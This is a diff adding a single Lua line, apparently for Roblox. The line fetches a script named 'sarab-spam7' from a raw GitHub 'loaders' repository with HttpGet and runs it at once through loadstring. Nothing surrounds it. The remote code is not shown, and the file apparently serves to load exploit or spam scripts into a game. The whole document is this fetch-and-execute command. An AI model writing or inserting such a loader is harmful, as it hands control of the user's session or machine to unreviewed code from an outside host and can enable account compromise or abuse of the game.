@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/sarab-spam7-tbxkw9gom4yb5r.lua"))()
